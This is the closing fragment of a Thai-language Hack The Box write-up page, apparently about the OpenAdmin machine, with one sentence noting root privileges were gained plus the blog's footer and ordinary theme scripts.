จะเห็นว่าเราได้ยกสิทธิ์ตัวเองเป็น <code>root</code> เรียบร้อย</p><p><img loading=lazy src=/images/htb_openadmin/root.png alt></p></div><footer class=post-footer><ul class=post-tags><li><a href=https://erbazz.me/tags/writeup/>writeup</a></li><li><a href=https://erbazz.me/tags/walkthrough/>walkthrough</a></li><li><a href=https://erbazz.me/tags/htb/>htb</a></li><li><a href=https://erbazz.me/tags/hackthebox/>hackthebox</a></li><li><a href=https://erbazz.me/tags/th/>th</a></li><li><a href=https://erbazz.me/tags/%E0%B8%A0%E0%B8%B2%E0%B8%A9%E0%B8%B2%E0%B9%84%E0%B8%97%E0%B8%A2/>ภาษาไทย</a></li></ul><nav class=paginav><a class=prev href=https://erbazz.me/writeup/htb_openadmin/><span class=title>« Prev</span><br><span>[Writeup] Hack The Box: OpenAdmin</span></a>
<a class=next href=https://erbazz.me/writeup/htb_craft/><span class=title>Next »</span><br><span>[Writeup] Hack The Box: Craft</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2023 <a href=https://erbazz.me/>ErbaZZ's Space</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(t){t.preventDefault();var e=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView({behavior:"smooth"}),e==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${e}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(t=>{const n=t.parentNode.parentNode,e=document.createElement("button");e.classList.add("copy-code"),e.innerHTML="copy";function s(){e.innerHTML="copied!",setTimeout(()=>{e.innerHTML="copy"},2e3)}e.addEventListener("click",o=>{if("clipboard"in navigator){navigator.clipboard.writeText(t.textContent),s();return}const e=document.createRange();e.selectNodeContents(t);const n=window.getSelection();n.removeAllRanges(),n.addRange(e);try{document.execCommand("copy"),s()}catch(e){}n.removeRange(e)}),n.classList.contains("highlight")?n.appendChild(e):n.parentNode.firstChild==n||(t.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?t.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(e):t.parentNode.appendChild(e))})</script></body></html>